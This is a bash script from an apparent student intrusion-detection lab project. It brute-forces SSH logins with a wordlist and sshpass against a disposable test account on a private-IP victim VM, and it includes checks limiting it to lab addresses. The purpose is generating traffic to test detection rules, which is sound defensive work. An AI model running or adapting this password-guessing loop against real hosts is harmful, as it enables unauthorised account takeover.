#!/usr/bin/env bash
#
# ssh_bruteforce.sh - Aegis IDS/IPS, Module 1 (Bishika Pokharel)
#
# Generates repeated failed SSH login attempts from the Attacker VM against
# the Victim VM, so the detection engine's signature rule (FR-11, FR-14) has
# real traffic to test against. FOR USE INSIDE THE ISOLATED HOST-ONLY LAB
# ONLY (NFR-3), against a disposable TEST account you create on the Victim
# VM for this purpose - never a real account or a machine you don't own.
#
# Usage:
#   ./ssh_bruteforce.sh <victim_ip> <test_username> <wordlist_path> --confirm-lab
#
# Example:
#   ./ssh_bruteforce.sh 192.168.56.11 testuser wordlist_sample.txt --confirm-lab
#
# Requires: sshpass, and that you run this ON the Attacker VM.
# Before running: on the Victim VM, create a disposable account (e.g.
#   sudo useradd -m testuser && sudo passwd testuser
# ) and set its real password to something NOT in your wordlist, so every
# attempt genuinely fails, the same way a real attacker's guesses would.

set -euo pipefail

usage() {
  echo "Usage: $0 <victim_ip> <test_username> <wordlist_path> --confirm-lab"
  echo "  --confirm-lab is required and only works against a private lab IP."
  exit 1
}

TARGET="${1:-}"
USERNAME="${2:-}"
WORDLIST="${3:-}"
CONFIRM="${4:-}"

[ -z "$TARGET" ] || [ -z "$USERNAME" ] || [ -z "$WORDLIST" ] && usage
[ "$CONFIRM" != "--confirm-lab" ] && { echo "Refusing to run: pass --confirm-lab as the 4th argument."; usage; }

if ! [[ "$TARGET" =~ ^(10\.|172\.(1[6-9]|2[0-9]|3[0-1])\.|192\.168\.) ]]; then
  echo "ERROR: $TARGET is not a private/lab address. This script will not target it."
  exit 1
fi

if [ ! -f "$WORDLIST" ]; then
  echo "Wordlist not found: $WORDLIST"
  exit 1
fi

if ! command -v sshpass >/dev/null; then
  echo "sshpass not found. Install it first: sudo apt install sshpass"
  exit 1
fi

echo "=== SSH brute force: target=$TARGET user=$USERNAME wordlist=$WORDLIST ==="
echo "Running against a disposable lab test account only. Stops after the wordlist."
echo "Start time: $(date)"

attempts=0
while IFS= read -r pass; do
  [ -z "$pass" ] && continue
  attempts=$((attempts + 1))
  echo "[attempt $attempts] trying a password..."
  sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 \
    "$USERNAME@$TARGET" exit 2>/dev/null \
    && echo "  (unexpected: this guess worked - check the test account's real password)" \
    || echo "  failed (expected)"
  sleep 1
done < "$WORDLIST"

echo "Stopped at: $(date). Total attempts: $attempts"
echo "Check eve.json / the detection engine for an SSH brute-force alert (TC-18)."
